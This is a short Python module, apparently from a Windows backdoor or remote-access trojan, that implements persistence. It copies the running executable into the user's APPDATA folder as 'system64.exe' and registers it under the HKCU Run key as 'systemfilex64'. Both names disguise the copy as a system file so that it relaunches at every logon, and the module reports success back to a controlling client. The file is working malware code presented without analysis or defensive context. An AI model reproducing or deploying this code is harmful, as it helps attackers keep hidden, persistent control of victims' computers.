from core.utils import display_msg
import os
import shutil
import winreg
import sys

def __persistant():
    curr_executable = sys.executable

    app_data = os.getenv("APPDATA")
    to_save_file = app_data +"\\"+"system64.exe"
    # display_msg("Current Executable: " + curr_executable, "y")
    # display_msg("Saved Name: "+ to_save_file, "y")


    if not os.path.exists(to_save_file):
        display_msg("Becoming Persistent")
        shutil.copyfile(curr_executable, to_save_file)

        key = winreg.HKEY_CURRENT_USER

        # "Software\Microsoft\Windows\CurrentVersion\Run"

        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)

        winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.REG_SZ, to_save_file)

        winreg.CloseKey(key_obj)
        return ("Successfuully Became Persistent")
    else:
        return ("Already Persistent")

def become_persistent(client):
    try:
        client.send_data(__persistant())
    except:
        client.send_data("Some error occured")    
